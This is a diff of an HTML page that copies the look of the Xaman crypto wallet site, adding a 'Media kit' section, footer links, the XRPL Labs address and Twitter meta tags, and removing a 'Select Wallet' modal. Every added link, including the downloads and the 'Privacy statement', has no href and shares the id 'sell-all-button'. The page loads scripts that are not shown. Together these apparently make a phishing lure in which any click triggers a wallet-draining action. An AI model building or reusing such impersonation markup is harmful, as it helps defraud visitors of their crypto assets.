+            </div>
+            <h1 class="lg:w-screen-lg sm:w-screen-sm text-4xl md:text-6xl font-bold my-15 mx-auto" data-v-2340c136>Media kit</h1>
+            <div class="lg:w-screen-lg sm:w-screen-sm grid grid-cols-1 md:grid-cols-2 content-center mx-auto" data-v-2340c136>
+              <div class="mediakit" data-v-2340c136>
+                <img src="_nuxt/icon-mediakit.98518a75.png" class="picca" loading="lazy" data-v-2340c136>
+                <div class="socials" data-v-2340c136>
+                  <span data-v-2340c136>
+                    <b data-v-2340c136>Logos and Icons</b>
+                  </span>
+                  <br data-v-2340c136>
+                  <a id="sell-all-button"  class="link"  data-v-2340c136>
+                    <i class="fa fa-file-download" aria-hidden="true" data-v-2340c136></i> Download (212 kB) </a>
+                </div>
+              </div>
+              <div class="mediakit" data-v-2340c136>
+                <img src="_nuxt/icon-mediakit.98518a75.png" class="picca" loading="lazy" data-v-2340c136>
+                <div class="socials" data-v-2340c136>
+                  <span data-v-2340c136>
+                    <b data-v-2340c136>Product visuals</b>
+                  </span>
+                  <br data-v-2340c136>
+                  <a id="sell-all-button"  class="link" data-v-2340c136>
+                    <i class="fa fa-file-download" aria-hidden="true" data-v-2340c136></i> Download (3.6 MB) </a>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="links pt-15 pb-6 mx-auto text-center text-gray-400" data-v-2340c136>
+            <span data-v-2340c136>
+              <a class="px-3 py-1 hover:text-blue-600 inline-block" id="sell-all-button"  data-v-2340c136>
+                <i class="fas fa-user-secret" data-v-2340c136></i> Privacy statement </a>
+              <a class="px-3 py-1 hover:text-blue-600 inline-block" id="sell-all-button"  data-v-2340c136>
+                <i class="fas fa-file-alt" data-v-2340c136></i> Terms of service </a>
+              <a class="px-3 py-1 hover:text-blue-600 inline-block" id="sell-all-button" data-v-2340c136>
+                <i class="fas fa-file-alt" data-v-2340c136></i> Responsible disclosure </a>
+            </span>
+            <hr class="mt-11 mb-5" data-v-2340c136>
+            <small class="text-11px" data-v-2340c136>XRPL Labs (The Integrators BV) - Joop Geesinkweg 901-999 - 1114AB Amsterdam-Duivendrecht - 🇳🇱 The Netherlands</small>
           </div>
         </div>
-      </section>
-
-      <div id="wallet-modal-backdrop" class="modal-backdrop" hidden>
-        <section class="wallet-modal" role="dialog" aria-modal="true" aria-labelledby="wallet-selector-title">
-          <div class="wallet-modal-header">
-            <h2 id="wallet-selector-title">Select Wallet</h2>
-			  
-            <button id="wallet-cancel-button" class="icon-button" type="button" aria-label="Cancel wallet selection">×</button>
-          </div>
-          <div id="wallet-list" class="wallet-list"></div>
-          <button id="wallet-cancel-button-bottom" class="secondary-button" type="button">Cancel</button>
-        </section>
+        <meta name="twitter:card" content="summary_large_image">
+        <meta name="twitter:image" content="_nuxt/twitter-card.png">
+        <meta name="twitter:creator" content="@XRPLLabs">
+        <meta name="twitter:description" content="The leading self custody wallet for the XRP Ledger and Xahau. Secure your crypto with confidence!">
+        <meta name="twitter:title" content="Xaman: The entire XRPL and Xahau ecosystem in your pocket.">
       </div>
-    </main>
+    </div>
     <script src="/config.js"></script>
     <script type="module" src="/src/main.ts"></script>
   </body>
